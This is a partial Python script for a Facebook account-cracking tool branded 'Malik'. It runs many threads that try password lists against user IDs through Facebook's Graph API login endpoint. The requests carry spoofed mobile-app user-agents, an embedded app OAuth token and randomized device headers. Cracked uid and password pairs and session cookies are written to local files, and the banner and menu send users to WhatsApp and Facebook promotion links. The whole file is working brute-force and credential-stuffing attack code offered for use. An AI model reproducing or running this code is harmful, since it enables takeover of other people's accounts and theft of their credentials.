...
os.system('xdg-open https://chat.whatsapp.com/FEEuoOl6R0h7P6Vr2C7MBX')
...
def ua_mafia():
	...
	END = "[FBAN/FB4A;FBAV/"+"61.0.0.15.69;FBBV/"+"20748118;FBDM/"+"{density=3.0,width=1080,height=1776};FBLC/"+"en_US;FBCR/"+"AT&-T;FBMF/"+"HTC;FBBD/"+"htc;FBPN/"+"com.facebook.katana;FBDV/"+"HTC One M9;FBSV/"+"5.1;nullFBCA/"+"armeabi-v7a:armeabi;]"
...
xxxx="[FBAN/"+"FB4A;FBAV/"+"61.0.0.15.69;FBBV/"+"20748118;FBDM/"+"{density=3.0,width=1080,height=1794};FBLC/"+"en_US;FBCR/"+"3;FBMF/"+"HUAWEI;FBBD/"+"HUAWEI;FBPN/com.facebook.katana;FBDV/"+"HUAWEI GRA-L09;FBSV/"+"5.0.1;nullFBCA/"+"armeabi-v7a:armeabi;]"

folder_path = '/sdcard/Malik'
try:
...
[96;1m .88b  d88.  .d8b.  db      d888888b db   dD
[93;1m 88'YbdP`88 d8' `8b 88        `88'   88 ,8P'
[97;1m 88  88  88 88ooo88 88         88    88,8P
[97;1m 88  88  88 88~~~88 88         88    88`8b
[93;1m 88  88  88 88   88 88booo.   .88.   88 `88.
[96;1m YP  YP  YP YP   YP Y88888P Y888888P YP   YD
                           
------------------------------------------------
[92;1m Author     :    Muhammad Ibrahim
[92;1m Facebook   :    Muhammad Ibrahim
[91;1m Status     :    Free
[93;1m Version    :    0.1
------------------------------------------------""")
...
def Main_Malik():
		...
		if shm =='1':
			...
			wp=('FEEuoOl6R0h7P6Vr2C7MBX')
			os.system(f'https://chat.whatsapp.com/{wp}')
			os.system('xdg-open https://www.facebook.com/sportallgames')
			Main_Malik()
		elif shm =='0':
...
#	print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123')
	...
	with tred(max_workers=30) as Malik:
		clear()
		tl = str(len(fo))
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				Malik.submit(api1,ids,names,passlist)
			else:
				Malik.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m [Malik]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				xxx = "[FB_IAB/FB4A;"+"FBAV/401.0.0.24.77;]","[FBAN/FB4A;"+"FBAV/92.866.944.616;"+"FBPN/com.facebook.katana;"+"FBLC/en_US;"+"FBBV/322216925;"+"FBCR/null;"+"FBMF/Huawei;"+"FBBD/Huawei;"+"FBDV/Huawei;"+"FBSV/Huawei.0.0;"+"FBCA/armeabi-v7a:armeabi;"+"FBDM/{density=2.25,width=646,height=1101};]","[FBAN/"+"MessengerLite;FBAV/"+"300.0.0.5.55;FBPN/"+"com.facebook.mlite;FBLC/"+"en;FBBV/"+"904853012;FBCR/"+"ZONG;FBMF/OPPO;FBBD/"+"OPPO;FBDV/CPH2219;FBSV/13;FBCA/"+"arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=1024,width=2048};]","[FBAN/FB4A;"+"FBAV/92.866.944.616;"+"FBPN/com.facebook.katana;"+"FBLC/en_US;"+"FBBV/322216925;"+"FBCR/null;"+"FBMF/Huawei;"+"FBBD/Huawei;"+"FBDV/Huawei;"+"FBSV/Huawei.0.0;"+"FBCA/armeabi-v7a:armeabi;"+"FBDM/{density=2.25,width=1063,height=1736};]","[FBAN/FB4A;"+"FBAV/92.866.944.616;"+"FBPN/com.facebook.katana;"+"FBLC/en_US;"+"FBBV/322216925;"+"FBCR/null;"+"FBMF/Samsung;"+"FBBD/Samsung;"+"FBDV/Samsung;"+"FBSV/Samsung.0.0;FBCA/armeabi-v7a:armeabi;"+"FBDM/{density=2.25,width=741,height=546};]","[FBAN/FB4A;"+"FBAV/92.866.944.616;"+"FBPN/com.facebook.katana;"+"FBLC/en_US;"+"FBBV/322216925;"+"FBCR/null;"+"FBMF/Realme;"+"FBBD/Realme;"+"FBDV/Realme;"+"FBSV/Realme.0.0;"+"FBCA/armeabi-v7a:armeabi;"+"FBDM/{density=2.25,width=1021,height=1475};]"
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Huawei;FBBD/Huawei;FBDV/Huawei;FBSV/Huawei.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=407,height=1845};]','[FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/sumsung;FBBD/sumsung;FBDV/sumsung;FBSV/sumsung.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=390,height=1823};]','[FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/xiaomi;FBBD/xiaomi;FBDV/xiaomi;FBSV/xiaomi.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=556,height=1231};]','[FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Lenovo;FBBD/Lenovo;FBDV/Lenovo;FBSV/Lenovo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=580,height=891};]','[FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Huawei;FBBD/Huawei;FBDV/Huawei;FBSV/Huawei.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=1063,height=1736};]","[FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Samsung;FBBD/Samsung;FBDV/Samsung;FBSV/Samsung.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=741,height=546};]','[FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Realme;FBBD/Realme;FBDV/Realme;FBSV/Realme.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=1021,height=1475};]"
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m [Malik-OK] '+uid+' | '+pas)
						#print(' \33[1;33m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'Malik_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'Malik_COOKIES.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [Malik-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'Malik-CP.txt')
...
def api1(ids,names,passlist):
	try:
		...
		for pw in passlist:
			...
			cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
			network = random.choice(['Zong','Roshan','null','Marshmallow','Telekom China'])
			xxx = "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/BSNL MOBILE;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Huawei;FBBD/Huawei;FBDV/Huawei;FBSV/Huawei.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=407,height=1845};]','[FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/sumsung;FBBD/sumsung;FBDV/sumsung;FBSV/sumsung.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=390,height=1823};]','[FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/xiaomi;FBBD/xiaomi;FBDV/xiaomi;FBSV/xiaomi.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=556,height=1231};]','[FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/Lenovo;FBBD/Lenovo;FBDV/Lenovo;FBSV/Lenovo.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width=580,height=891};]"
			head = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [Malik-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'Malik_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
